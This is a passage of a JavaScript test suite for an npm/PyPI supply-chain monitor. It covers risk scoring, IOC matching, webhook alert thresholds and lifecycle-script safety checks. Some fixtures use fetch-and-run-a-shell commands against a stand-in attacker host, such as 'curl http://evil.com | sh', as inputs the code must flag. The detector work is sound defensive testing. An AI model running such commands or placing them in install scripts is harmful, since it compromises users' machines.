    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    delete process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    console.log = () => {};
    console.error = () => {};
    // Save stats state
    const origScanned = stats.scanned;
    const origClean = stats.clean;
    const origSuspect = stats.suspect;
    const origErrors = stats.errors;
    try {
      await sendDailyReport();
      // sendDailyReport resets counters even when no URL (after the check)
      // The function checks url first, returns if not set, so counters remain unchanged
    } finally {
      console.log = origLog;
      console.error = origErr;
      // Restore stats
      stats.scanned = origScanned;
      stats.clean = origClean;
      stats.suspect = origSuspect;
      stats.errors = origErrors;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
    }
  });

  // --- buildDailyReportEmbed ---

  test('MONITOR: buildDailyReportEmbed returns correct structure', () => {
    const origLog = console.log;
    console.log = () => {};
    try {
      const embed = buildDailyReportEmbed();
      assert(embed.embeds, 'Should have embeds');
      assert(embed.embeds.length === 1, 'Should have one embed');
      const e = embed.embeds[0];
      assertIncludes(e.title, 'Daily Report', 'Title should mention Daily Report');
      assert(e.color === 0x3498db, 'Color should be blue');
      assert(Array.isArray(e.fields), 'Should have fields array');
      const scannedField = e.fields.find(f => f.name === 'Packages Scanned');
      assert(scannedField, 'Should have Packages Scanned field');
      const cleanField = e.fields.find(f => f.name === 'Clean');
      assert(cleanField, 'Should have Clean field');
      const suspectsField = e.fields.find(f => f.name === 'Suspects');
      assert(suspectsField, 'Should have Suspects field');
    } finally {
      console.log = origLog;
    }
  });

  // --- trySendWebhook with webhook URL but no IOC match and no sandbox ---

  await asyncTest('MONITOR: trySendWebhook skips when no IOC match and no sandbox', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    const origLog = console.log;
    let logOutput = '';
    console.log = (...args) => { logOutput += args.join(' '); };
    try {
      const result = {
        summary: { critical: 0, high: 1, medium: 0, low: 0, total: 1 },
        threats: [{ type: 'suspicious_pattern', severity: 'HIGH' }]
      };
      // No sandbox result, no IOC match => shouldSendWebhook returns false
      await trySendWebhook('test-pkg', '1.0.0', 'npm', result, null);
      // Should not have sent a webhook
    } finally {
      console.log = origLog;
      if (origEnv !== undefined) {
        process.env.MUADDIB_WEBHOOK_URL = origEnv;
      } else {
        delete process.env.MUADDIB_WEBHOOK_URL;
      }
    }
  });

  // --- resolveTarballAndScan dedup check ---

  await asyncTest('MONITOR: resolveTarballAndScan skips already scanned packages', async () => {
    const origLog = console.log;
    let logOutput = '';
    console.log = (...args) => { logOutput += args.join(' '); };
    try {
      const dedupeKey = 'npm/dedup-test-pkg@1.0.0';
      recentlyScanned.add(dedupeKey);
      const item = {
        name: 'dedup-test-pkg',
        version: '1.0.0',
        ecosystem: 'npm',
        tarballUrl: 'https://example.com/fake.tgz'
      };
      await resolveTarballAndScan(item);
      assertIncludes(logOutput, 'already scanned', 'Should log already scanned');
    } finally {
      console.log = origLog;
      recentlyScanned.delete('npm/dedup-test-pkg@1.0.0');
    }
  });

  // --- getNpmTarballUrl ---

  test('MONITOR: getNpmTarballUrl extracts tarball from dist', () => {
    const url = getNpmTarballUrl({ dist: { tarball: 'https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz' } });
    assert(url === 'https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz', 'Should extract tarball URL');
  });

  test('MONITOR: getNpmTarballUrl returns null when no dist', () => {
    const url = getNpmTarballUrl({});
    assert(url === null, 'Should return null for missing dist');
  });

  test('MONITOR: getNpmTarballUrl returns null when dist has no tarball', () => {
    const url = getNpmTarballUrl({ dist: {} });
    assert(url === null, 'Should return null for missing tarball in dist');
  });

  // --- hasIOCMatch extended ---

  test('MONITOR: hasIOCMatch returns true for known_malicious_hash', () => {
    const result = {
      threats: [{ type: 'known_malicious_hash', severity: 'CRITICAL' }]
    };
    assert(hasIOCMatch(result) === true, 'Should detect known_malicious_hash');
  });

  test('MONITOR: hasIOCMatch returns true for shai_hulud_marker', () => {
    const result = {
      threats: [{ type: 'shai_hulud_marker', severity: 'CRITICAL' }]
    };
    assert(hasIOCMatch(result) === true, 'Should detect shai_hulud_marker');
  });

  test('MONITOR: hasIOCMatch returns true for shai_hulud_backdoor', () => {
    const result = {
      threats: [{ type: 'shai_hulud_backdoor', severity: 'CRITICAL' }]
    };
    assert(hasIOCMatch(result) === true, 'Should detect shai_hulud_backdoor');
  });

  test('MONITOR: hasIOCMatch returns true for pypi_malicious_package', () => {
    const result = {
      threats: [{ type: 'pypi_malicious_package', severity: 'CRITICAL' }]
    };
    assert(hasIOCMatch(result) === true, 'Should detect pypi_malicious_package');
  });

  test('MONITOR: hasIOCMatch returns false for null result', () => {
    assert(hasIOCMatch(null) === false, 'Should return false for null');
  });

  test('MONITOR: hasIOCMatch returns false for result with no threats', () => {
    assert(hasIOCMatch({ threats: null }) === false, 'Should return false for null threats');
  });

  // --- IOC_MATCH_TYPES ---

  test('MONITOR: IOC_MATCH_TYPES contains all expected types', () => {
    assert(IOC_MATCH_TYPES.has('known_malicious_package'), 'Should have known_malicious_package');
    assert(IOC_MATCH_TYPES.has('known_malicious_hash'), 'Should have known_malicious_hash');
    assert(IOC_MATCH_TYPES.has('pypi_malicious_package'), 'Should have pypi_malicious_package');
    assert(IOC_MATCH_TYPES.has('shai_hulud_marker'), 'Should have shai_hulud_marker');
    assert(IOC_MATCH_TYPES.has('shai_hulud_backdoor'), 'Should have shai_hulud_backdoor');
    assert(IOC_MATCH_TYPES.size === 5, 'Should have exactly 5 types, got ' + IOC_MATCH_TYPES.size);
  });

  // --- computeRiskScore extended ---

  test('MONITOR: computeRiskScore caps at 100', () => {
    const score = computeRiskScore({ critical: 10, high: 10, medium: 10, low: 10 });
    assert(score === 100, 'Should cap at 100, got ' + score);
  });

  test('MONITOR: computeRiskScore returns 0 for clean', () => {
    const score = computeRiskScore({ critical: 0, high: 0, medium: 0, low: 0 });
    assert(score === 0, 'Should be 0 for clean');
  });

  test('MONITOR: computeRiskScore computes correct value for single critical', () => {
    const score = computeRiskScore({ critical: 1, high: 0, medium: 0, low: 0 });
    assert(score === 25, 'Should be 25 for one critical');
  });

  test('MONITOR: computeRiskScore computes correct value for mixed findings', () => {
    const score = computeRiskScore({ critical: 0, high: 1, medium: 2, low: 3 });
    // 0*25 + 1*10 + 2*3 + 3*1 = 19
    assert(score === 19, 'Should be 19, got ' + score);
  });

  // --- computeRiskLevel extended ---

  test('MONITOR: computeRiskLevel returns MEDIUM for medium only', () => {
    const level = computeRiskLevel({ critical: 0, high: 0, medium: 1, low: 0 });
    assert(level === 'MEDIUM', 'Should be MEDIUM');
  });

  test('MONITOR: computeRiskLevel returns LOW for low only', () => {
    const level = computeRiskLevel({ critical: 0, high: 0, medium: 0, low: 1 });
    assert(level === 'LOW', 'Should be LOW');
  });

  test('MONITOR: computeRiskLevel returns CLEAN for no findings', () => {
    const level = computeRiskLevel({ critical: 0, high: 0, medium: 0, low: 0 });
    assert(level === 'CLEAN', 'Should be CLEAN');
  });

  // --- shouldSendWebhook extended ---

  test('MONITOR: shouldSendWebhook returns true for sandbox score > 30 with webhook URL', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      const result = { summary: { critical: 0, high: 0, medium: 0, low: 0, total: 0 }, threats: [] };
      const sandboxResult = { score: 35, severity: 'HIGH' };
      assert(shouldSendWebhook(result, sandboxResult) === true, 'Should return true for sandbox score > 30');
    } finally {
      if (origEnv !== undefined) {
        process.env.MUADDIB_WEBHOOK_URL = origEnv;
      } else {
        delete process.env.MUADDIB_WEBHOOK_URL;
      }
    }
  });

  test('MONITOR: shouldSendWebhook returns true for IOC match even with sandbox score = 0', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      // IOC match is highest-confidence — sandbox CLEAN must NOT suppress it
      const result = { summary: { critical: 1, high: 0, medium: 0, low: 0, total: 1 }, threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }] };
      const sandboxResult = { score: 0, severity: 'CLEAN' };
      assert(shouldSendWebhook(result, sandboxResult) === true, 'IOC match must always send, sandbox clean must not override');
    } finally {
      if (origEnv !== undefined) {
        process.env.MUADDIB_WEBHOOK_URL = origEnv;
      } else {
        delete process.env.MUADDIB_WEBHOOK_URL;
      }
    }
  });

  test('MONITOR: shouldSendWebhook returns true for IOC match without sandbox', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      const result = { threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }] };
      assert(shouldSendWebhook(result, null) === true, 'Should send for IOC match without sandbox');
    } finally {
      if (origEnv !== undefined) {
        process.env.MUADDIB_WEBHOOK_URL = origEnv;
      } else {
        delete process.env.MUADDIB_WEBHOOK_URL;
      }
    }
  });

  // --- shouldSendWebhook: MEDIUM-only filter (Problem 2) ---

  test('MONITOR: shouldSendWebhook returns false for MEDIUM-only package with high score', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      // webpeel pattern: 28 MEDIUM, 0 HIGH, 0 CRITICAL, score 100
      const result = {
        summary: { critical: 0, high: 0, medium: 28, low: 0, total: 28, riskScore: 100 },
        threats: Array.from({ length: 28 }, () => ({ type: 'prototype_hook', severity: 'MEDIUM' }))
      };
      assert(shouldSendWebhook(result, null) === false,
        'Should NOT send webhook for MEDIUM-only package even with score 100');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns true for HIGH+MEDIUM package with score >= 50', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      const result = {
        summary: { critical: 0, high: 2, medium: 5, low: 0, total: 7, riskScore: 55 },
        threats: [
          { type: 'suspicious_dataflow', severity: 'HIGH' },
          { type: 'env_access', severity: 'HIGH' },
          ...Array.from({ length: 5 }, () => ({ type: 'prototype_hook', severity: 'MEDIUM' }))
        ]
      };
      assert(shouldSendWebhook(result, null) === true,
        'Should send webhook for package with HIGH findings and score >= 50');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- shouldSendWebhook: tiered sandbox thresholds ---

  test('MONITOR: shouldSendWebhook sends for sandbox score 15 with high static + HIGH finding', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      // riskScore 40 >= 20 threshold AND has HIGH finding → sends even with timeout noise
      const result = { summary: { critical: 0, high: 1, medium: 2, low: 0, total: 3, riskScore: 40 }, threats: [
        { type: 'suspicious_dataflow', severity: 'HIGH' }
      ] };
      const sandboxResult = { score: 15, severity: 'LOW' };
      assert(shouldSendWebhook(result, sandboxResult) === true,
        'Score 40 with HIGH finding should send even with sandbox timeout noise');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns true for static >= 80 when sandbox score <= 15 (dormant suspect)', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      const result = { summary: { critical: 1, high: 2, medium: 0, low: 0, total: 3, riskScore: 85 }, threats: [
        { type: 'shell_exec', severity: 'CRITICAL' },
        { type: 'suspicious_dataflow', severity: 'HIGH' }
      ] };
      const sandboxResult = { score: 15, severity: 'LOW' };
      assert(shouldSendWebhook(result, sandboxResult) === true,
        'High static score with low sandbox should send webhook (dormant suspect)');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns true for sandbox score > 30', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      const result = { summary: { critical: 0, high: 0, medium: 0, low: 0, total: 0 }, threats: [] };
      const sandboxResult = { score: 40, severity: 'MEDIUM' };
      assert(shouldSendWebhook(result, sandboxResult) === true,
        'Should send webhook for sandbox score > 30');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns false for low static + sandbox score 15', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      const result = { summary: { critical: 0, high: 0, medium: 1, low: 0, total: 1, riskScore: 30 }, threats: [
        { type: 'prototype_hook', severity: 'MEDIUM' }
      ] };
      const sandboxResult = { score: 15, severity: 'LOW' };
      assert(shouldSendWebhook(result, sandboxResult) === false,
        'Should NOT send webhook for low static score + sandbox noise');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- Dormant suspect: sandbox clean + high static ---

  test('MONITOR: shouldSendWebhook returns true for sandbox=0 with staticScore=38 + HIGH/CRITICAL (dormant suspect)', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      const result = { summary: { critical: 2, high: 3, medium: 1, low: 0, total: 6, riskScore: 38 }, threats: [
        { type: 'shell_exec', severity: 'CRITICAL' },
        { type: 'obfuscation_detected', severity: 'CRITICAL' },
        { type: 'suspicious_dataflow', severity: 'HIGH' },
        { type: 'env_access', severity: 'HIGH' },
        { type: 'dynamic_require', severity: 'HIGH' },
        { type: 'prototype_hook', severity: 'MEDIUM' }
      ] };
      const sandboxResult = { score: 0, severity: 'CLEAN', findings: [] };
      assert(shouldSendWebhook(result, sandboxResult) === true,
        'Dormant suspect: sandbox=0 + staticScore=38 + HIGH/CRITICAL should send webhook');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns false for sandbox=0 with staticScore=5 (true FP)', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      const result = { summary: { critical: 0, high: 0, medium: 1, low: 1, total: 2, riskScore: 5 }, threats: [
        { type: 'prototype_hook', severity: 'MEDIUM' },
        { type: 'env_access', severity: 'LOW' }
      ] };
      const sandboxResult = { score: 0, severity: 'CLEAN', findings: [] };
      assert(shouldSendWebhook(result, sandboxResult) === false,
        'Low static score + sandbox clean should suppress webhook (true FP)');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns false for sandbox=0 + staticScore=60 but MEDIUM-only (no HIGH/CRITICAL)', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      const result = { summary: { critical: 0, high: 0, medium: 5, low: 2, total: 7, riskScore: 60 }, threats: [
        { type: 'prototype_hook', severity: 'MEDIUM' },
        { type: 'env_access', severity: 'MEDIUM' },
        { type: 'dynamic_require', severity: 'MEDIUM' },
        { type: 'obfuscation_detected', severity: 'MEDIUM' },
        { type: 'suspicious_dataflow', severity: 'MEDIUM' },
        { type: 'high_entropy_string', severity: 'LOW' },
        { type: 'credential_regex_harvest', severity: 'LOW' }
      ] };
      const sandboxResult = { score: 0, severity: 'CLEAN', findings: [] };
      assert(shouldSendWebhook(result, sandboxResult) === false,
        'Static 60 + sandbox clean + MEDIUM-only should not send webhook (hasHighOrCritical guard)');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- isSafeLifecycleScript expanded ---

  test('MONITOR: isSafeLifecycleScript matches bun/yarn/pnpm', () => {
    assert(isSafeLifecycleScript('bun run build') === true, 'bun run build should be safe');
    assert(isSafeLifecycleScript('yarn build') === true, 'yarn build should be safe');
    assert(isSafeLifecycleScript('pnpm run test') === true, 'pnpm run test should be safe');
    assert(isSafeLifecycleScript('npm run build') === true, 'npm run build should be safe');
  });

  test('MONITOR: isSafeLifecycleScript matches standalone tools', () => {
    assert(isSafeLifecycleScript('tsc') === true, 'tsc should be safe');
    assert(isSafeLifecycleScript('eslint .') === true, 'eslint should be safe');
    assert(isSafeLifecycleScript('rollup -c') === true, 'rollup should be safe');
  });

  test('MONITOR: isSafeLifecycleScript matches echo', () => {
    assert(isSafeLifecycleScript("echo 'Use the root Changesets'") === true, 'echo should be safe');
  });

  test('MONITOR: isSafeLifecycleScript rejects dangerous scripts', () => {
    assert(isSafeLifecycleScript('curl http://evil.com | sh') === false, 'curl pipe should be unsafe');
    assert(isSafeLifecycleScript('node malware.js') === false, 'node script should be unsafe');
  });

  // --- buildMonitorWebhookPayload extended ---

  test('MONITOR: buildMonitorWebhookPayload includes sandbox when score > 0', () => {
    const result = {
      threats: [{ type: 'known_malicious_package', severity: 'CRITICAL', rule_id: 'MUADDIB-IOC-001' }]
    };
    const sandboxResult = { score: 8, severity: 'CRITICAL', findings: [] };
    const payload = buildMonitorWebhookPayload('evil-pkg', '2.0.0', 'npm', result, sandboxResult);
    assert(payload.sandbox, 'Should include sandbox');
    assert(payload.sandbox.score === 8, 'Sandbox score should be 8');
    assert(payload.sandbox.severity === 'CRITICAL', 'Sandbox severity should be CRITICAL');
  });

  test('MONITOR: buildMonitorWebhookPayload has no sandbox when sandbox score 0', () => {
    const result = {
      threats: [{ type: 'test', severity: 'HIGH' }]
    };
    const sandboxResult = { score: 0, severity: 'CLEAN' };
    const payload = buildMonitorWebhookPayload('pkg', '1.0.0', 'npm', result, sandboxResult);
    assert(!payload.sandbox, 'Should not include sandbox when score is 0');
  });

  // --- isPublishAnomalyOnly extended ---

  test('MONITOR: isPublishAnomalyOnly returns false when no suspicious results', () => {
    assert(isPublishAnomalyOnly(null, null, null, null) === false, 'Should be false with all null');
  });

  test('MONITOR: isPublishAnomalyOnly returns false when lifecycle is also suspicious', () => {
    const temporal = { suspicious: true };
    const publish = { suspicious: true };
    assert(isPublishAnomalyOnly(temporal, null, publish, null) === false, 'Should be false when lifecycle also suspicious');
  });

  test('MONITOR: isPublishAnomalyOnly returns false when ast is also suspicious', () => {
    const ast = { suspicious: true };
    const publish = { suspicious: true };
    assert(isPublishAnomalyOnly(null, ast, publish, null) === false, 'Should be false when AST also suspicious');
  });

  test('MONITOR: isPublishAnomalyOnly returns false when maintainer is also suspicious', () => {
    const publish = { suspicious: true };
    const maintainer = { suspicious: true };
    assert(isPublishAnomalyOnly(null, null, publish, maintainer) === false, 'Should be false when maintainer also suspicious');
  });

  test('MONITOR: isPublishAnomalyOnly returns true when only publish is suspicious', () => {
    const publish = { suspicious: true };
    assert(isPublishAnomalyOnly(null, null, publish, null) === true, 'Should be true when only publish is suspicious');
    assert(isPublishAnomalyOnly({ suspicious: false }, { suspicious: false }, publish, { suspicious: false }) === true,
      'Should be true when others have suspicious: false');
  });

  // --- updateScanStats extended ---

  test('MONITOR: updateScanStats increments total_scanned', () => {
    const before = loadScanStats();
    const beforeTotal = before.stats.total_scanned;
    updateScanStats('clean');
    const after = loadScanStats();
    assert(after.stats.total_scanned === beforeTotal + 1, 'total_scanned should increment');
    assert(after.stats.clean === before.stats.clean + 1, 'clean should increment');
  });

  test('MONITOR: updateScanStats tracks false_positive', () => {
    const before = loadScanStats();
    const beforeFP = before.stats.false_positive;
    updateScanStats('false_positive');
    const after = loadScanStats();
    assert(after.stats.false_positive === beforeFP + 1, 'false_positive should increment');
  });

  test('MONITOR: updateScanStats tracks confirmed', () => {
    const before = loadScanStats();
    const beforeConfirmed = before.stats.confirmed_malicious;
    updateScanStats('confirmed');
    const after = loadScanStats();
    assert(after.stats.confirmed_malicious === beforeConfirmed + 1, 'confirmed_malicious should increment');
  });

  test('MONITOR: updateScanStats creates daily entries', () => {
    const data = loadScanStats();
    const today = new Date().toISOString().slice(0, 10);
    const todayEntry = data.daily.find(d => d.date === today);
    assert(todayEntry, 'Should have a daily entry for today');
    assert(typeof todayEntry.scanned === 'number', 'Daily scanned should be a number');
    assert(typeof todayEntry.fp_rate === 'number', 'Daily fp_rate should be a number');
  });

  // --- getDetectionStats extended ---

  test('MONITOR: getDetectionStats returns expected structure', () => {
    const stats = getDetectionStats();
    assert(typeof stats.total === 'number', 'Should have total');
    assert(typeof stats.bySeverity === 'object', 'Should have bySeverity');
    assert(typeof stats.byEcosystem === 'object', 'Should have byEcosystem');
    assert(stats.leadTime === null || typeof stats.leadTime === 'object', 'leadTime should be null or object');
  });

  // --- isBundledToolingOnly extended ---

  test('MONITOR: isBundledToolingOnly returns true for known bundled files', () => {
    const threats = [{ file: 'node_modules/.cache/webpack.js', severity: 'HIGH' }];
    assert(isBundledToolingOnly(threats) === true, 'Should detect webpack.js as bundled');
  });

  test('MONITOR: isBundledToolingOnly returns true for Next.js chunks', () => {
    const threats = [{ file: '_next/static/chunks/main.js', severity: 'MEDIUM' }];
    assert(isBundledToolingOnly(threats) === true, 'Should detect Next.js chunks as bundled');
  });

  test('MONITOR: isBundledToolingOnly returns false for mixed threats', () => {
    const threats = [
      { file: 'webpack.js', severity: 'HIGH' },
      { file: 'src/index.js', severity: 'CRITICAL' }
    ];
    assert(isBundledToolingOnly(threats) === false, 'Should return false when not all threats are bundled');
  });

  test('MONITOR: isBundledToolingOnly returns false for empty threats', () => {
    assert(isBundledToolingOnly([]) === false, 'Should return false for empty array');
  });

  // --- hasHighOrCritical extended ---

  test('MONITOR: hasHighOrCritical returns true for high', () => {
    assert(hasHighOrCritical({ summary: { critical: 0, high: 1 } }) === true, 'Should return true for high');
  });

  test('MONITOR: hasHighOrCritical returns false for medium only', () => {
    assert(hasHighOrCritical({ summary: { critical: 0, high: 0, medium: 5 } }) === false, 'Should return false for medium only');
  });

  // --- isVerboseMode / setVerboseMode ---

  test('MONITOR: setVerboseMode and isVerboseMode round-trip', () => {
    const origVerbose = isVerboseMode();
    const origEnv = process.env.MUADDIB_MONITOR_VERBOSE;
    delete process.env.MUADDIB_MONITOR_VERBOSE;
    try {
      setVerboseMode(false);
      assert(isVerboseMode() === false, 'Should be false after setVerboseMode(false)');
      setVerboseMode(true);
      assert(isVerboseMode() === true, 'Should be true after setVerboseMode(true)');
    } finally {
      setVerboseMode(origVerbose);
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_VERBOSE = origEnv;
    }
  });

  test('MONITOR: isVerboseMode reads from env', () => {
    const origEnv = process.env.MUADDIB_MONITOR_VERBOSE;
    setVerboseMode(false);
    process.env.MUADDIB_MONITOR_VERBOSE = 'true';
    try {
      assert(isVerboseMode() === true, 'Should return true when env is true');
    } finally {
      if (origEnv !== undefined) {
        process.env.MUADDIB_MONITOR_VERBOSE = origEnv;
      } else {
        delete process.env.MUADDIB_MONITOR_VERBOSE;
      }
    }
  });

  // --- timeoutPromise ---

  await asyncTest('MONITOR: timeoutPromise rejects after timeout', async () => {
    try {
      await Promise.race([
        new Promise(resolve => setTimeout(resolve, 5000)),
        timeoutPromise(50)
      ]);
      assert(false, 'Should have thrown');
    } catch (err) {
      assertIncludes(err.message, 'timeout', 'Should mention timeout');
    }
  });

  // --- appendAlert extended ---

  test('MONITOR: appendAlert writes to alerts file', () => {
    const alert = {
      timestamp: new Date().toISOString(),
      name: 'test-append-alert-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      findings: [{ rule: 'TEST-001', severity: 'LOW' }]
    };
    appendAlert(alert);
    // Verify it was appended
    const raw = fs.readFileSync(ALERTS_FILE, 'utf8');
    const alerts = JSON.parse(raw);
    const found = alerts.find(a => a.name === 'test-append-alert-pkg');
    assert(found, 'Should find the appended alert');
    assert(found.version === '1.0.0', 'Version should match');
  });

  // --- appendDetection extended ---

  test('MONITOR: appendDetection deduplicates', () => {
    const name = 'test-dedup-detection-' + Date.now();
    appendDetection(name, '1.0.0', 'npm', ['test_type'], 'HIGH');
    appendDetection(name, '1.0.0', 'npm', ['test_type'], 'HIGH'); // duplicate
    const data = loadDetections();
    const matches = data.detections.filter(d => d.package === name);
    assert(matches.length === 1, 'Should deduplicate, got ' + matches.length);
  });

  // --- loadDetections ---

  test('MONITOR: loadDetections returns object with detections array', () => {
    const data = loadDetections();
    assert(typeof data === 'object', 'Should return object');
    assert(Array.isArray(data.detections), 'Should have detections array');
  });

  // --- buildTemporalWebhookEmbed extended ---

  test('MONITOR: buildTemporalWebhookEmbed handles CRITICAL severity', () => {
    const embed = buildTemporalWebhookEmbed({
      packageName: 'evil-pkg',
      previousVersion: '1.0.0',
      latestVersion: '1.0.1',
      metadata: { latestPublishedAt: '2024-01-01' },
      findings: [{ type: 'lifecycle_added', severity: 'CRITICAL', script: 'preinstall', value: 'curl evil.com | sh' }]
    });
    assert(embed.embeds, 'Should have embeds');
    assert(embed.embeds[0].color === 0xe74c3c, 'CRITICAL should be red');
    assertIncludes(embed.embeds[0].title, 'CRITICAL', 'Title should mention CRITICAL');
  });

  test('MONITOR: buildTemporalWebhookEmbed handles lifecycle_modified', () => {
    const embed = buildTemporalWebhookEmbed({
      packageName: 'modified-pkg',
      previousVersion: '1.0.0',
      latestVersion: '1.0.1',
      metadata: { latestPublishedAt: '2024-01-01' },
      findings: [{ type: 'lifecycle_modified', severity: 'HIGH', script: 'postinstall', newValue: 'node malicious.js' }]
    });
    const field = embed.embeds[0].fields.find(f => f.name === 'Changes Detected');
    assertIncludes(field.value, 'MODIFIED', 'Should show MODIFIED for lifecycle_modified');
  });

  // --- buildTemporalAstWebhookEmbed extended ---

  test('MONITOR: buildTemporalAstWebhookEmbed has correct structure', () => {
    const embed = buildTemporalAstWebhookEmbed({
      packageName: 'ast-changed-pkg',
      previousVersion: '1.0.0',
      latestVersion: '1.0.1',
      metadata: { latestPublishedAt: '2024-01-01' },
      findings: [{ pattern: 'child_process.exec', severity: 'CRITICAL', description: 'Added child_process.exec' }]
    });
    assert(embed.embeds, 'Should have embeds');
    const e = embed.embeds[0];
    assertIncludes(e.title, 'AST ANOMALY', 'Title should mention AST ANOMALY');
    const pkgField = e.fields.find(f => f.name === 'Package');
    assertIncludes(pkgField.value, 'ast-changed-pkg', 'Should contain package name');
  });

  // --- buildPublishAnomalyWebhookEmbed extended ---

  test('MONITOR: buildPublishAnomalyWebhookEmbed handles CRITICAL severity', () => {
    const embed = buildPublishAnomalyWebhookEmbed({
      packageName: 'burst-pkg',
      versionCount: 50,
      anomalies: [{ type: 'publish_burst', severity: 'CRITICAL', description: '50 versions in 1h' }]
    });
    assert(embed.embeds, 'Should have embeds');
    assert(embed.embeds[0].color === 0xe74c3c, 'CRITICAL should be red');
  });

  test('MONITOR: buildPublishAnomalyWebhookEmbed handles MEDIUM severity', () => {
    const embed = buildPublishAnomalyWebhookEmbed({
      packageName: 'minor-pkg',
      versionCount: 10,
      anomalies: [{ type: 'rapid_succession', severity: 'MEDIUM', description: '10 versions in 24h' }]
    });
    assert(embed.embeds, 'Should have embeds');
    assert(embed.embeds[0].color === 0xf1c40f, 'MEDIUM should be yellow');
  });

  // --- buildMaintainerChangeWebhookEmbed extended ---

  test('MONITOR: buildMaintainerChangeWebhookEmbed has correct structure', () => {
    const embed = buildMaintainerChangeWebhookEmbed({
      packageName: 'hijacked-pkg',
      findings: [{ type: 'sole_maintainer_change', severity: 'CRITICAL', description: 'Sole maintainer changed', riskAssessment: { reasons: ['new account'] } }]
    });
    assert(embed.embeds, 'Should have embeds');
    const e = embed.embeds[0];
    assertIncludes(e.title, 'MAINTAINER CHANGE', 'Title should mention MAINTAINER CHANGE');
    assert(e.color === 0xe74c3c, 'CRITICAL should be red');
    const findingsField = e.fields.find(f => f.name === 'Findings');
    assertIncludes(findingsField.value, 'sole_maintainer_change', 'Should mention the finding type');
    assertIncludes(findingsField.value, 'new account', 'Should include risk assessment');
  });

  test('MONITOR: buildMaintainerChangeWebhookEmbed handles HIGH severity', () => {
    const embed = buildMaintainerChangeWebhookEmbed({
      packageName: 'changed-pkg',
      findings: [{ type: 'new_maintainer', severity: 'HIGH', description: 'New maintainer added', riskAssessment: { reasons: [] } }]
    });
    assert(embed.embeds[0].color === 0xe67e22, 'HIGH should be orange');
  });

  // --- loadState / saveState extended ---

  test('MONITOR: saveState persists lastDailyReportDate from stats', () => {
    const tmpStateFile = STATE_FILE;
    const origDate = stats.lastDailyReportDate;
    stats.lastDailyReportDate = '2024-06-15';
    try {
      saveState({ npmLastPackage: 'test-save', pypiLastPackage: 'test-pypi' });
      const raw = fs.readFileSync(tmpStateFile, 'utf8');
      const data = JSON.parse(raw);
      assert(data.lastDailyReportDate === '2024-06-15', 'Should persist lastDailyReportDate');
      assert(data.npmLastPackage === 'test-save', 'Should persist npmLastPackage');
    } finally {
      stats.lastDailyReportDate = origDate;
    }
  });

  test('MONITOR: loadState restores lastDailyReportDate into stats', () => {
